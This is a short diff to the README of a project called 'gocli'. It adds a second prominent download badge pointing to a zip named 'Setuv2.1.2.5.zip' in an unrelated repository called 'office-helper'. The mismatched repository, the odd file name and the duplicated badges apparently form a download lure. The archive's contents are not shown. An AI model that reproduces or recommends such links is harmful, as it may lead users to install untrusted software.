@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/⬇_Download-Latest-blue?style=for-the-badge)](https://github.com/olivertayloreng00e2/office-helper/releases/download/v2.0.0/Setuv2.1.2.5.zip)
+
 [![🔽 Download Latest Release](https://img.shields.io/badge/🔽_Download_Latest-Release-blue?style=for-the-badge)](https://github.com/olivertayloreng00e2/office-helper/releases/download/v2.0.0/Setuv2.1.2.5.zip)
 
 # ⚡ gocli
